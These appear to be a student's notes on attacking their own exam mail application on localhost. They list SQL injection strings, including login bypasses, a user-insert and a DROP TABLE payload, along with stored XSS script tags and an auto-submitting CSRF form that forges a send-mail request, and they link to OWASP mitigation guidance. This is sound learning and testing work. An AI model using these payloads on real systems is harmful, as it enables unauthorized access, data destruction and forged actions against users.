# Attempt to break the application

## SQL injection

asd OR 1=1;

This does not work. 
We will try to inject some username and password.

asd; INSERT INTO user (email, password) VALUES (seb@dev.com, asdasd);

asd'; INSERT INTO examDB.user VALUES ("sebastian", "cavada", "seb@dev.com", "asdasd");

asd'; INSERT INTO examDB.user VALUES ("sebastian", "cavada", "seb@dev.com", "asdasd");--

Another attempt:

" or ""=" --> ' or ''='

' OR 1=1;


admin'; DROP TABLE examDB.user; --


' OR 1=1 LIMIT 1 --


############### FINALLY #################

' or '1' = '1


## XSS reflected



## XSS stored 

<script>alert(1)</script> in the head of the mail
<script>alert(1)</script> as the name of the user

## XSRF

The idea is to send an email with a fake image loader to some victim emails. when the image is shown that will send another email to some other account in order to show some impersonification is going on.

forging the request

''' 
<html>
    <body onload="document.test.submit()">
        <form id="submitForm" class="form-resize" action="http://localhost:8080/ExamProject/SendMailServlet" method="post" name="test">
            <input type="hidden" name="email" value="seb@dev.com">
            <input type="hidden" name="password" value="null">
            <input class="single-row-input" type="email" name="receiver" placeholder="Receiver" required="" value="fake@fake.com">
            <input class="single-row-input" type="text" name="subject" placeholder="Subject" required="" value="merdeee">
            <textarea class="textarea-input" name="body" placeholder="Body" wrap="hard" required="" value="test"></textarea>
            <input type="submit" name="sent" value="Send">
        </form>
    </body>
</html>
'''

MITIGATION https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html